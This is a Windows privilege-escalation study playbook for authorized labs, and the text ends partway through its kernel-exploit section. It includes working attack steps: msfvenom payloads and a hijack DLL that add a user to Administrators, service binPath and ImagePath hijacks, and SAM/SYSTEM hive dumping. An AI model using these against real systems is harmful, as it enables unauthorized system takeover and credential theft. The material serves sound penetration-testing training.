# Windows Privilege Escalation Playbook

> **Purpose:** A structured Windows privilege-escalation reference for authorized labs, OSCP-style practice, and GPEN preparation.
>
> **Methodology:** `Enumerate → Identify → Verify → Exploit → Confirm → Document`

Windows privilege escalation is primarily an enumeration and permissions-analysis problem. Do not execute techniques blindly. For each possible path, identify the privileged component, determine what the current user controls, and verify that the component will consume attacker-controlled input.

---

## Table of Contents

1. [Rules of Engagement](#1-rules-of-engagement)
2. [High-Priority Workflow](#2-high-priority-workflow)
3. [Initial Access and Shell Context](#3-initial-access-and-shell-context)
4. [System Enumeration](#4-system-enumeration)
5. [Users, Groups, Tokens, and Privileges](#5-users-groups-tokens-and-privileges)
6. [Credential and Secret Hunting](#6-credential-and-secret-hunting)
7. [Services](#7-services)
8. [Unquoted Service Paths](#8-unquoted-service-paths)
9. [Weak Service Executable Permissions](#9-weak-service-executable-permissions)
10. [Weak Service Configuration Permissions](#10-weak-service-configuration-permissions)
11. [Weak Service Registry Permissions](#11-weak-service-registry-permissions)
12. [DLL Hijacking](#12-dll-hijacking)
13. [Scheduled Tasks](#13-scheduled-tasks)
14. [Startup Applications and Autoruns](#14-startup-applications-and-autoruns)
15. [Registry Misconfigurations](#15-registry-misconfigurations)
16. [Token Impersonation and Potato Techniques](#16-token-impersonation-and-potato-techniques)
17. [Dangerous User Rights](#17-dangerous-user-rights)
18. [Installer, Software, and Application Weaknesses](#18-installer-software-and-application-weaknesses)
19. [Writable Files and Directories](#19-writable-files-and-directories)
20. [Network, Shares, and Internal Services](#20-network-shares-and-internal-services)
21. [Kernel and Local Exploits](#21-kernel-and-local-exploits)
22. [Automated Enumeration](#22-automated-enumeration)
23. [File Transfer](#23-file-transfer)
24. [Reusable Lab Payloads](#24-reusable-lab-payloads)
25. [Troubleshooting](#25-troubleshooting)
26. [Exam Quick Reference](#26-exam-quick-reference)
27. [Finding Documentation Template](#27-finding-documentation-template)
28. [Useful Resources](#28-useful-resources)

---

# 1. Rules of Engagement

Use these techniques only on systems you own or are explicitly authorized to test.

During an exam or engagement:

- Record commands, output, and modified files.
- Verify prerequisites before exploitation.
- Prefer configuration weaknesses over unstable kernel exploits.
- Avoid unnecessary account, firewall, or service changes.
- Back up files before replacing them.
- Use payloads appropriate to the target architecture.
- Restore modified configurations when required.
- Do not confuse administrative commands with privilege-escalation findings.

For every potential path, answer:

1. Which process or component runs with elevated privileges?
2. Which file, registry key, service, task, or environment value can I control?
3. What exact permission grants that control?
4. How is the privileged component triggered?
5. Will it run as `SYSTEM`, an administrator, or another user?
6. How will I verify success safely?

---

# 2. High-Priority Workflow

After obtaining a shell:

1. Establish identity, integrity level, architecture, and host context.
2. Inspect token privileges with `whoami /priv`.
3. Inspect local and domain group memberships.
4. Hunt for stored credentials, command history, and configuration secrets.
5. Enumerate services and their permissions.
6. Check unquoted paths and writable service binaries.
7. Inspect scheduled tasks and writable task actions.
8. Check startup folders, autoruns, and registry run keys.
9. Test `AlwaysInstallElevated`.
10. Investigate impersonation, backup, restore, and ownership privileges.
11. Enumerate installed software and application-specific weaknesses.
12. Run WinPEAS and compare its findings with manual enumeration.
13. Consider kernel exploits only after safer paths fail.

---

# 3. Initial Access and Shell Context

## 3.1 RDP

```bash
xfreerdp /v:TARGET_IP /u:USERNAME /p:'PASSWORD' /cert:ignore +clipboard /dynamic-resolution
```

Optional drive mapping:

```bash
xfreerdp /v:TARGET_IP /u:USERNAME /p:'PASSWORD' /cert:ignore +clipboard /dynamic-resolution /drive:share,/LOCAL_DIRECTORY
```

## 3.2 Command Shells

Command Prompt:

```cmd
cmd.exe
```

PowerShell:

```cmd
powershell.exe
```

Check language mode:

```powershell
$ExecutionContext.SessionState.LanguageMode
```

Check whether the process is 32-bit or 64-bit:

```powershell
[Environment]::Is64BitProcess
[Environment]::Is64BitOperatingSystem
```

From CMD:

```cmd
echo %PROCESSOR_ARCHITECTURE%
echo %PROCESSOR_ARCHITEW6432%
```

## 3.3 Shell Quality

Record:

- Interactive or non-interactive
- CMD or PowerShell
- 32-bit or 64-bit process
- Current working directory
- Available writable directories
- Network egress
- Antivirus or EDR interference
- Whether tools can be transferred

A 32-bit shell on 64-bit Windows can encounter filesystem redirection. `C:\Windows\Sysnative` may provide access to 64-bit system binaries from a 32-bit process.

---

# 4. System Enumeration

## 4.1 Identity and Host

```cmd
whoami
hostname
echo %USERNAME%
echo %USERDOMAIN%
echo %COMPUTERNAME%
```

PowerShell:

```powershell
[System.Security.Principal.WindowsIdentity]::GetCurrent()
```

## 4.2 Operating System

```cmd
systeminfo
ver
wmic os get Caption,Version,BuildNumber,OSArchitecture
```

Modern PowerShell alternative:

```powershell
Get-CimInstance Win32_OperatingSystem |
    Select-Object Caption, Version, BuildNumber, OSArchitecture
```

Record:

- Edition
- Version
- Build number
- Architecture
- Installed hotfixes
- Domain or workgroup
- Boot time

## 4.3 Hotfixes

```cmd
wmic qfe get HotFixID,InstalledOn,Description
```

PowerShell:

```powershell
Get-HotFix
```

Do not determine exploitability from a missing KB number alone. Superseding updates and backported fixes may apply.

## 4.4 Environment

```cmd
set
echo %PATH%
echo %TEMP%
echo %TMP%
```

PowerShell:

```powershell
Get-ChildItem Env:
$env:Path -split ';'
```

Look for:

- Credentials
- API keys or tokens
- Writable PATH directories
- Application-specific variables
- Database connection strings
- Cloud credentials
- Proxy settings

## 4.5 Drives and Filesystems

```cmd
wmic logicaldisk get Caption,Description,FileSystem,FreeSpace,Size
fsutil fsinfo drives
mountvol
```

PowerShell:

```powershell
Get-PSDrive -PSProvider FileSystem
Get-Volume
```

## 4.6 Processes

```cmd
tasklist
tasklist /v
tasklist /svc
wmic process get ProcessId,ParentProcessId,Name,ExecutablePath,CommandLine
```

PowerShell:

```powershell
Get-Process
Get-CimInstance Win32_Process |
    Select-Object ProcessId, ParentProcessId, Name, ExecutablePath, CommandLine
```

Look for:

- Processes running as privileged users
- Credentials in command lines
- Custom applications
- Backup agents
- Monitoring tools
- Database clients
- Writable executable paths
- Processes listening only on localhost

## 4.7 Network

```cmd
ipconfig /all
route print
arp -a
netstat -ano
ipconfig /displaydns
```

PowerShell:

```powershell
Get-NetIPAddress
Get-NetRoute
Get-NetTCPConnection
Get-NetUDPEndpoint
```

Map listening PIDs to processes:

```cmd
tasklist /fi "PID eq PID_NUMBER"
```

## 4.8 Firewall

Enumeration:

```cmd
netsh advfirewall show allprofiles
netsh advfirewall firewall show rule name=all
```

PowerShell:

```powershell
Get-NetFirewallProfile
Get-NetFirewallRule
```

Do not disable the firewall unless explicitly authorized and necessary.

---

# 5. Users, Groups, Tokens, and Privileges

## 5.1 Current Token

```cmd
whoami /all
whoami /user
whoami /groups
whoami /priv
```

Record:

- User SID
- Group SIDs
- Integrity level
- Enabled and disabled privileges
- Local administrator membership
- Domain group memberships

## 5.2 Local Users and Groups

```cmd
net user
net user USERNAME
net localgroup
net localgroup Administrators
```

PowerShell:

```powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
```

## 5.3 Domain Context

```cmd
whoami /fqdn
net config workstation
net user /domain
net group /domain
net group "Domain Admins" /domain
nltest /domain_trusts
nltest /dclist:DOMAIN.LOCAL
```

Domain enumeration is contextual. A domain group is not automatically relevant to local privilege escalation.

## 5.4 Sessions

```cmd
query user
quser
qwinsta
net session
```

Check for:

- Interactive administrator sessions
- Disconnected privileged sessions
- Service accounts
- Remote desktop sessions
- Processes owned by privileged users

---

# 6. Credential and Secret Hunting

## 6.1 Stored Credentials

```cmd
cmdkey /list
```

Stored credentials may be usable with applications that support Windows credential manager. The presence of a target does not automatically expose the password.

## 6.2 PowerShell History

```cmd
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

PowerShell:

```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath
```

Other user histories:

```powershell
Get-ChildItem C:\Users -Force -Recurse -ErrorAction SilentlyContinue `
    -Filter ConsoleHost_history.txt
```

## 6.3 Unattended Installation Files

Common locations:

```text
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\Sysprep\sysprep.xml
C:\Windows\System32\Sysprep\Panther\Unattend.xml
```

Search:

```cmd
dir C:\unattend.xml /s /b
dir C:\sysprep.xml /s /b
```

Read:

```cmd
type C:\Windows\Panther\Unattend.xml
```

Passwords may be plaintext, encoded, redacted, or absent. Base64 is encoding, not encryption.

Decode from Linux:

```bash
printf '%s' 'BASE64_VALUE' | base64 -d
```

PowerShell:

```powershell
[Text.Encoding]::Unicode.GetString(
    [Convert]::FromBase64String("BASE64_VALUE")
)
```

The correct text encoding depends on the source.

## 6.4 Configuration Files

Search selected locations rather than scanning the whole drive immediately:

```cmd
dir C:\inetpub\*.config /s /b
dir C:\xampp\*.ini /s /b
dir C:\Users\*.xml /s /b
dir C:\Users\*.config /s /b
dir C:\*.kdbx /s /b
```

PowerShell:

```powershell
Get-ChildItem C:\inetpub,C:\Users,C:\ProgramData,C:\xampp `
    -Recurse -Force -ErrorAction SilentlyContinue `
    -Include *.config,*.xml,*.ini,*.txt,*.yml,*.yaml,*.json,*.kdbx
```

Search content:

```cmd
findstr /si /m "password passwd pwd secret token connectionstring" C:\inetpub\*.config C:\Users\*.xml C:\Users\*.ini
```

PowerShell:

```powershell
Get-ChildItem C:\inetpub,C:\Users,C:\ProgramData `
    -Recurse -File -ErrorAction SilentlyContinue |
    Select-String -Pattern 'password|passwd|pwd|secret|token|connection.?string' `
    -CaseSensitive:$false
```

High-value files include:

```text
web.config
appsettings.json
applicationHost.config
unattend.xml
sysprep.xml
*.kdbx
*.rdp
*.ppk
*.pem
*.pfx
*.config
*.ini
*.xml
```

## 6.5 Registry Credentials

Winlogon:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Look for:

```text
DefaultUserName
DefaultPassword
AutoAdminLogon
```

PuTTY sessions:

```cmd
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

VNC, database clients, deployment tools, and custom applications may store credentials in other registry locations.

## 6.6 IIS

```cmd
type C:\Windows\System32\inetsrv\config\applicationHost.config
```

PowerShell:

```powershell
Get-ChildItem C:\inetpub -Recurse -Filter web.config -ErrorAction SilentlyContinue
```

Look for:

- Connection strings
- Service-account credentials
- Virtual-directory credentials
- Application pool identities
- Encrypted configuration sections
- Reused local passwords

## 6.7 Saved Files and Backups

```cmd
dir C:\*.bak /s /b
dir C:\*.old /s /b
dir C:\*.save /s /b
dir C:\*.zip /s /b
dir C:\*.7z /s /b
```

PowerShell:

```powershell
Get-ChildItem C:\Users,C:\inetpub,C:\ProgramData `
    -Recurse -Force -ErrorAction SilentlyContinue `
    -Include *.bak,*.old,*.save,*.zip,*.7z
```

## 6.8 Browser and Process Memory

Memory collection can expose secrets but is intrusive and may require permissions. Use only when authorized.

Potential sources:

- Browser process dumps
- Password managers
- Command shells
- Deployment tools
- Database clients
- Custom applications

Search a transferred dump on Linux:

```bash
strings process.dmp | grep -iE 'authorization|password|token|cookie'
```

Do not assume all Base64-looking data is a credential.

---

# 7. Services

Services are among the highest-value Windows privilege-escalation targets.

## 7.1 Enumerate

```cmd
sc query
sc query state= all
wmic service get Name,DisplayName,State,StartMode,StartName,PathName
```

PowerShell:

```powershell
Get-CimInstance Win32_Service |
    Select-Object Name, DisplayName, State, StartMode, StartName, PathName
```

## 7.2 Inspect a Service

```cmd
sc qc SERVICE_NAME
sc query SERVICE_NAME
```

PowerShell:

```powershell
Get-CimInstance Win32_Service -Filter "Name='SERVICE_NAME'" |
    Format-List *
```

Record:

- `BINARY_PATH_NAME`
- Service account
- Start type
- Current state
- Dependencies
- Whether the path is quoted
- Whether the executable or directory is writable
- Whether the user can modify or restart the service

## 7.3 Service Permissions

Sysinternals AccessChk:

```cmd
accesschk64.exe -accepteula -uwcqv USERNAME SERVICE_NAME
accesschk64.exe -accepteula -uwcv SERVICE_NAME
```

Common dangerous service rights:

```text
SERVICE_CHANGE_CONFIG
SERVICE_START
SERVICE_STOP
WRITE_DAC
WRITE_OWNER
GENERIC_WRITE
GENERIC_ALL
```

A weak service permission is useful only when:

- The service runs as a privileged account.
- The user can modify a meaningful property.
- The service can be started or restarted, or another trigger exists.

## 7.4 Service Triggering

```cmd
sc stop SERVICE_NAME
sc start SERVICE_NAME
```

Check status:

```cmd
sc query SERVICE_NAME
```

Common errors:

```text
ERROR_SERVICE_ALREADY_RUNNING
ERROR_SERVICE_NOT_ACTIVE
ERROR_ACCESS_DENIED
ERROR_SERVICE_REQUEST_TIMEOUT
```

A service payload may execute successfully even when the service returns a timeout because the payload is not a valid long-running Windows service.

---

# 8. Unquoted Service Paths

## 8.1 Vulnerable Condition

An unquoted service path can be exploitable when:

1. The executable path contains spaces.
2. The complete path is not enclosed in quotes.
3. The current user can create a file in one of the directories Windows may test.
4. The service runs with elevated privileges.
5. The service can be restarted or otherwise triggered.

Example:

```text
C:\Program Files\Vendor Application\Service App\service.exe
```

Possible search candidates include:

```text
C:\Program.exe
C:\Program Files\Vendor.exe
C:\Program Files\Vendor Application\Service.exe
```

The exact candidates depend on path parsing. Do not assume every space creates a writable opportunity.

## 8.2 Enumerate

```cmd
wmic service get Name,StartName,PathName |
    findstr /i /v "C:\Windows\\" |
    findstr /i /v """
```

PowerShell:

```powershell
Get-CimInstance Win32_Service |
    Where-Object {
        $_.PathName -match ' ' -and
        $_.PathName -notmatch '^\s*"'
    } |
    Select-Object Name, StartName, State, PathName
```

## 8.3 Verify Candidate Directory Permissions

```cmd
icacls "C:\Program Files\Vendor Application"
```

AccessChk:

```cmd
accesschk64.exe -accepteula -uwdq "C:\Program Files\Vendor Application"
```

Look for write, modify, create-file, or full-control rights for the current user or one of their groups.

## 8.4 Exploitation Pattern

Place a compatible executable at the exact candidate path Windows will test.

Example service-style payload generation in a lab:

```bash
msfvenom -p windows/x64/exec CMD='cmd.exe /c net localgroup Administrators USERNAME /add' \
    -f exe-service -o Service.exe
```

Copy it to the verified writable candidate location, then restart the service.

## 8.5 Common False Positives

- The service path is already quoted.
- No tested parent directory is writable.
- The apparent path comes from arguments, not the executable path.
- The service runs as the current low-privileged user.
- The user cannot restart the service.
- Endpoint security blocks the replacement executable.

---

# 9. Weak Service Executable Permissions

## 9.1 Vulnerable Condition

A privileged service executable or a required file is writable by a low-privileged user.

## 9.2 Enumerate

First identify service paths:

```powershell
Get-CimInstance Win32_Service |
    Select-Object Name, StartName, State, PathName
```

Check a target:

```cmd
icacls "C:\Program Files\Vendor\Service\service.exe"
```

AccessChk:

```cmd
accesschk64.exe -accepteula -wvu "C:\Program Files\Vendor\Service"
```

Dangerous rights include:

```text
F
M
W
FILE_ALL_ACCESS
FILE_GENERIC_WRITE
```

## 9.3 Verify the Exact File

```cmd
icacls "C:\Program Files\Vendor\Service\service.exe"
dir "C:\Program Files\Vendor\Service\service.exe"
```

PowerShell:

```powershell
Get-Acl "C:\Program Files\Vendor\Service\service.exe" | Format-List
```

## 9.4 Exploitation Pattern

Back up the original:

```cmd
copy "C:\Program Files\Vendor\Service\service.exe" C:\Temp\service.exe.bak
```

Replace it with an architecture-compatible service executable:

```cmd
copy /y C:\Temp\payload.exe "C:\Program Files\Vendor\Service\service.exe"
```

Trigger:

```cmd
sc stop SERVICE_NAME
sc start SERVICE_NAME
```

Confirm:

```cmd
whoami
net localgroup Administrators
```

## 9.5 Caveats

- A normal console executable may run but cause a service timeout.
- The executable may be locked while the service is running.
- The service may verify signatures or hashes.
- The user must have permission to restart the service or wait for another trigger.
- Preserve the original file for cleanup.

---

# 10. Weak Service Configuration Permissions

## 10.1 Vulnerable Condition

The current user has permission such as `SERVICE_CHANGE_CONFIG` over a service running as a privileged account.

## 10.2 Enumerate

```cmd
accesschk64.exe -accepteula -uwcqv USERNAME *
```

Specific service:

```cmd
accesschk64.exe -accepteula -uwcqv USERNAME SERVICE_NAME
```

## 10.3 Inspect Before Modification

```cmd
sc qc SERVICE_NAME
```

Record the original:

- Binary path
- Service account
- Start type
- Dependencies

## 10.4 Exploitation Pattern

A simple lab action:

```cmd
sc config SERVICE_NAME binPath= "cmd.exe /c net localgroup Administrators USERNAME /add"
```

The space after `binPath=` is required by `sc.exe`.

Trigger:

```cmd
sc stop SERVICE_NAME
sc start SERVICE_NAME
```

Verify:

```cmd
net localgroup Administrators
```

Restore the original binary path after testing:

```cmd
sc config SERVICE_NAME binPath= "ORIGINAL_PATH"
```

## 10.5 Common Failures

- Missing space after `binPath=`.
- The user can change configuration but cannot start the service.
- The service is protected.
- The configured service account is not privileged.
- Quoting is incorrect.
- The payload exits immediately and causes a timeout, though its command may still execute.

---

# 11. Weak Service Registry Permissions

## 11.1 Vulnerable Condition

A low-privileged user can modify a service registry key, especially its `ImagePath`, and the service runs with elevated privileges.

Service registry path:

```text
HKLM\SYSTEM\CurrentControlSet\Services\SERVICE_NAME
```

## 11.2 Enumerate

PowerShell:

```powershell
Get-Acl "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SERVICE_NAME" |
    Format-List
```

Registry query:

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SERVICE_NAME"
```

Look for rights such as:

```text
FullControl
SetValue
WriteKey
GenericWrite
GenericAll
```

## 11.3 Exploitation Pattern

Record the original `ImagePath`:

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SERVICE_NAME" /v ImagePath
```

Change it:

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SERVICE_NAME" ^
    /v ImagePath /t REG_EXPAND_SZ ^
    /d "C:\Temp\payload.exe" /f
```

Trigger:

```cmd
sc stop SERVICE_NAME
sc start SERVICE_NAME
```

Verify and restore the original value.

## 11.4 Distinguish Permission Types

Do not confuse:

- Permission to modify the service object through the Service Control Manager
- Permission to modify its registry key
- Permission to replace its executable
- Permission to start or stop it

Any one may exist without the others.

---

# 12. DLL Hijacking

## 12.1 Vulnerable Condition

A privileged process attempts to load a DLL from a location writable by the current user, or searches a writable directory before the legitimate DLL location.

Required questions:

1. Which exact DLL is requested?
2. Which directories are searched?
3. Which directory is writable?
4. What architecture is the process?
5. What privileges does it run with?
6. How can it be triggered?

## 12.2 Identify Missing DLL Loads

Process Monitor workflow:

1. Start Process Monitor with sufficient privileges.
2. Filter `Process Name` to the target.
3. Filter `Result` to `NAME NOT FOUND`.
4. Trigger the service or application.
5. Review attempted DLL paths.

Command-line alternatives may include application-specific tracing, but Procmon is generally the clearest lab tool.

## 12.3 Verify Directory Permissions

```cmd
icacls C:\Path\To\Candidate
```

AccessChk:

```cmd
accesschk64.exe -accepteula -wvu C:\Path\To\Candidate
```

## 12.4 Example DLL

```c
#include <windows.h>
#include <stdlib.h>

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpReserved
) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        WinExec(
            "cmd.exe /c net localgroup Administrators USERNAME /add",
            SW_HIDE
        );
    }
    return TRUE;
}
```

Compile for 64-bit:

```bash
x86_64-w64-mingw32-gcc hijack.c -shared -o hijack.dll
```

Compile for 32-bit:

```bash
i686-w64-mingw32-gcc hijack.c -shared -o hijack.dll
```

Place it at the exact missing path and trigger the privileged process.

## 12.5 Common Failures

- Wrong DLL filename
- Wrong architecture
- Missing exported function required by the application
- Safe DLL search mode prevents the expected path
- The process uses an absolute DLL path
- The candidate directory is not writable
- The process does not run with elevated privileges
- The DLL causes the service to crash before the desired action completes

---

# 13. Scheduled Tasks

## 13.1 Enumerate

```cmd
schtasks /query /fo LIST /v
```

PowerShell:

```powershell
Get-ScheduledTask
Get-ScheduledTask | Get-ScheduledTaskInfo
```

Inspect a task:

```cmd
schtasks /query /tn "TASK_NAME" /fo LIST /v
```

PowerShell:

```powershell
Get-ScheduledTask -TaskName "TASK_NAME" | Format-List *
```

## 13.2 Vulnerable Conditions

A task may be exploitable when:

- It runs as `SYSTEM` or an administrator.
- Its executable or script is writable.
- Its working directory or parent directory permits file replacement.
- It executes a relative path.
- It loads a writable configuration or DLL.
- Its task definition can be modified.
- It runs on a predictable trigger.

## 13.3 Inspect Actions

PowerShell:

```powershell
(Get-ScheduledTask -TaskName "TASK_NAME").Actions
(Get-ScheduledTask -TaskName "TASK_NAME").Principal
(Get-ScheduledTask -TaskName "TASK_NAME").Triggers
```

## 13.4 Verify Action Permissions

```cmd
icacls "C:\Path\To\TaskScript.ps1"
icacls "C:\Path\To\TaskExecutable.exe"
```

Check parent directories as well.

## 13.5 Trigger

```cmd
schtasks /run /tn "TASK_NAME"
```

The current user may not have permission to run it manually. In that case, wait for the configured trigger in an authorized lab.

## 13.6 Task Definition Files

Task files are commonly stored under:

```text
C:\Windows\System32\Tasks
```

Access is normally restricted. A writable task file is unusual and high value, but direct modification can corrupt the task.

---

# 14. Startup Applications and Autoruns

## 14.1 Startup Folders

System-wide startup:

```text
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

Current-user startup:

```text
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
```

Check permissions:

```cmd
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

## 14.2 Vulnerable Condition

A low-privileged user can place or replace an executable in a startup location that will be run by a more privileged user at logon.

This is often dependent on another user logging in and therefore may be less reliable than service-based escalation.

## 14.3 Registry Run Keys

```cmd
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
```

Check permissions on interesting keys and target executables.

PowerShell:

```powershell
Get-Acl "Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
```

## 14.4 Autoruns

Sysinternals Autoruns helps enumerate:

- Logon entries
- Services
- Scheduled tasks
- Drivers
- Explorer extensions
- AppInit DLLs
- Image hijacks

A listed autorun is not automatically vulnerable. Verify write permissions on the referenced file, directory, or registry key.

---

# 15. Registry Misconfigurations

## 15.1 AlwaysInstallElevated

### Vulnerable Condition

Both values must be enabled:

```text
HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

Check:

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKCU\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
```

Expected on both:

```text
REG_DWORD    0x1
```

### Lab Exploitation Pattern

Generate an MSI suitable for the target architecture:

```bash
msfvenom -p windows/x64/exec \
    CMD='cmd.exe /c net localgroup Administrators USERNAME /add' \
    -f msi -o setup.msi
```

Install:

```cmd
msiexec /quiet /qn /i C:\Temp\setup.msi
```

### Common False Positives

- Only the HKLM value is enabled.
- Only the HKCU value is enabled.
- Policy is present but set to `0`.
- Application control blocks the installer.
- The payload architecture or format is wrong.

## 15.2 AutoLogon Credentials

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Look for:

```text
DefaultDomainName
DefaultUserName
DefaultPassword
AutoAdminLogon
```

Credentials may be absent or stored elsewhere by newer management solutions.

## 15.3 Writable Run Keys

Check ACLs on startup-related keys:

```powershell
Get-Acl "Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" |
    Format-List
```

A writable registry autorun is useful only if it executes under a more privileged user's context.

---

# 16. Token Impersonation and Potato Techniques

## 16.1 Relevant Privileges

Check:

```cmd
whoami /priv
```

Commonly relevant privileges:

```text
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
```

These privileges are often assigned to service accounts such as IIS application pool identities, SQL Server service accounts, or other service contexts.

## 16.2 Technique Families

Common historical families include:

```text
Hot Potato
Rotten Potato
Juicy Potato
Rogue Potato
PrintSpoofer
SweetPotato
GodPotato
```

Compatibility depends on:

- Windows version and build
- Patch state
- Available privileges
- COM or RPC behavior
- Network and named-pipe conditions
- Service account context
- Defender or EDR
- Whether the technique requires a specific CLSID

Do not select a tool by name alone.

## 16.3 Basic Decision Process

1. Confirm `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.
2. Record OS version and build.
3. Identify whether the host is a workstation, server, or domain controller.
4. Select a technique documented for that build and context.
5. Prefer a local command proof before a reverse shell.
6. Confirm the resulting token with `whoami /all`.

## 16.4 Hot Potato Caveat

Hot Potato and Tater depend on older name-resolution, NTLM authentication, and relay conditions. Modern Windows security controls often prevent the technique. It should be treated as a version-specific lab technique rather than a universal impersonation method.

---

# 17. Dangerous User Rights

The token may contain privileges beyond impersonation that can create escalation paths.

## 17.1 `SeBackupPrivilege`

May allow reading files while bypassing normal ACL checks through backup semantics.

Potential targets:

```text
SAM
SYSTEM
SECURITY
NTDS.dit
sensitive configuration files
private keys
```

A common local workflow is to save registry hives:

```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
```

Whether this succeeds depends on the token and process enabling the privilege.

## 17.2 `SeRestorePrivilege`

May permit writing files while bypassing normal ACL checks through restore semantics. This can support replacement of protected files, but exploitation requires a suitable tool and careful target selection.

## 17.3 `SeTakeOwnershipPrivilege`

May permit taking ownership of protected securable objects:

```cmd
takeown /f "C:\Path\To\File"
```

Taking ownership does not automatically grant write access. The ACL may still need to be changed:

```cmd
icacls "C:\Path\To\File" /grant USERNAME:F
```

This is intrusive and should be documented and restored.

## 17.4 `SeDebugPrivilege`

May allow opening and manipulating other processes. Practical exploitation depends on process protection, architecture, security controls, and available tooling.

## 17.5 `SeLoadDriverPrivilege`

May allow loading a kernel driver. Exploitation is highly version-specific and carries stability risk.

## 17.6 `SeManageVolumePrivilege`

Historically associated with file and volume operations that may lead to privilege escalation in specific contexts. Validate exact tooling and OS behavior.

## 17.7 `SeCreateTokenPrivilege` and `SeTcbPrivilege`

These are rare and highly privileged rights. Their presence deserves careful investigation with purpose-built, authorized tooling.

---

# 18. Installer, Software, and Application Weaknesses

## 18.1 Installed Software

```cmd
wmic product get Name,Version,Vendor
```

`wmic product` can be slow and may trigger MSI consistency checks. Prefer registry enumeration:

```cmd
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall" /s
reg query "HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s
```

PowerShell:

```powershell
Get-ItemProperty `
    HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*, `
    HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* `
    -ErrorAction SilentlyContinue |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallLocation
```

## 18.2 Application-Specific Paths

Investigate:

- Writable installation directories
- Weak update mechanisms
- Writable plugins
- Writable service wrappers
- Configuration files containing credentials
- Administrative web interfaces on localhost
- Database credentials
- Backup agents
- Development tools
- Third-party remote management software

## 18.3 Version Validation

A detected version is only a lead. Confirm:

- Exact build
- Edition
- Architecture
- Patch or hotfix state
- Service configuration
- Exploit prerequisites
- Reliability and impact

---

# 19. Writable Files and Directories

## 19.1 ACL Basics

`icacls` abbreviations commonly include:

```text
F   Full control
M   Modify
RX  Read and execute
R   Read
W   Write
```

Inheritance markers include:

```text
OI  Object inherit
CI  Container inherit
IO  Inherit only
```

Do not interpret `(W)` on a directory as automatically granting every useful action. Test whether the user can create, overwrite, rename, or delete the specific target.

## 19.2 Check a Path

```cmd
icacls "C:\Path"
```

PowerShell:

```powershell
Get-Acl "C:\Path" | Format-List
```

AccessChk:

```cmd
accesschk64.exe -accepteula -wvu "C:\Path"
```

## 19.3 High-Value Locations

```text
C:\Program Files
C:\Program Files (x86)
C:\ProgramData
C:\inetpub
C:\Windows\System32\Tasks
custom service directories
backup directories
application plugin directories
```

A writable directory is relevant when a privileged process loads or executes content from it.

## 19.4 PATH Directories

Display:

```cmd
echo %PATH%
```

PowerShell:

```powershell
$env:Path -split ';'
```

Check each non-system directory:

```cmd
icacls "C:\Path\Entry"
```

PATH hijacking requires a privileged application to invoke a command without a fully qualified path and to use an attacker-influenced search path.

## 19.5 Parent Directory Replacement

A file may not be writable, while its parent directory allows deletion and replacement. Test carefully:

```cmd
icacls "C:\Parent\Directory"
icacls "C:\Parent\Directory\target.exe"
```

Back up the original before any replacement.

---

# 20. Network, Shares, and Internal Services

## 20.1 Shares

```cmd
net share
net use
net view
net view \\TARGET
```

PowerShell:

```powershell
Get-SmbShare
Get-SmbMapping
```

Investigate:

- Deployment shares
- Backup shares
- Scripts
- Group-policy remnants
- Configuration files
- Credentials
- Writable application directories

## 20.2 Current Connections

```cmd
net use
net session
```

Mapped drives may expose credentials or privileged deployment content.

## 20.3 Localhost Services

```cmd
netstat -ano | findstr LISTENING
```

Map PIDs:

```cmd
tasklist /fi "PID eq PID_NUMBER"
```

Internal applications bound to `127.0.0.1` may expose administrative functionality not reachable remotely.

## 20.4 Named Pipes

Named pipes can be relevant for impersonation or service interaction. Enumeration generally requires specialized tooling. Treat a pipe as a lead, not a vulnerability by itself.

---

# 21. Kernel and Local Exploits

Use kernel or driver exploits after configuration-based paths have been exhausted.

## 21.1 Collect Exact Information

```cmd
systeminfo
wmic os get Caption,Version,BuildNumber,OSArchitecture
wmic qfe get HotFixID,InstalledOn
driverquery /v
```

PowerShell:

```powershell
Get-CimInstance Win32_OperatingSystem
Get-HotFix
Get-CimInstance Win32_SystemDriver
```

## 21.2 Validation Checklist

Before running an exploit, verify:

- Exact OS edition
- Version and build
- Architecture
- Patch state
- Exploit prerequisites
- Required token privileges
- Required service or driver
